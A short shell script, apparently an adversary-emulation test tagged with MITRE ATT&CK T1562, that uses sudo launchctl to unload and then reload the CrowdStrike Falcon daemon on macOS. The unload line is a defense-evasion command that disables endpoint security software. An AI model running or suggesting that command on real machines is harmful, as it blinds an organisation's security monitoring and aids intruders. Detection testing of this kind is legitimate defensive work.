#!/usr/bin/env sh
# ATTACK_DEFENSE_EVASION_T1562_MACOS_DISABLE_SECURITY_TOOLS
sudo launchctl unload /System/Library/LaunchDaemons/com.crowdstrike.falcond
sudo launchctl load /System/Library/LaunchDaemons/com.crowdstrike.falcond
